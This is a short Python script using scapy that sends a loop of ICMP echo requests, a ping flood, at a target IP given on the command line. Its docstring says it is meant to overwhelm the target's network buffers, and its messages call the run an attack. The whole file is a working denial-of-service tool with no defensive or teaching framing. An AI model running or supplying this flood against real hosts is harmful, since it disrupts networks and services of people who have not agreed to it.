import sys
import time
from scapy.all import IP, ICMP, Raw, send

def launch_icmp_flood(target_ip, packet_count=400, delay=0.005):
    """
    Sends ICMP Echo Requests (Ping Flood) to overwhelm target network buffers.
    """
    print(f"[*] Starting ICMP Echo Flood against {target_ip} ({packet_count} packets)...")
    sent = 0
    payload = b"X" * 64
    try:
        for _ in range(packet_count):
            packet = IP(dst=target_ip) / ICMP(type=8, code=0) / Raw(load=payload)
            send(packet, verbose=False)
            sent += 1
            if delay > 0:
                time.sleep(delay)
        print(f"[+] ICMP Flood completed. Total packets sent: {sent}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user. Sent: {sent}")
    except Exception as e:
        print(f"[-] Error during ICMP flood: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    launch_icmp_flood(target, count)
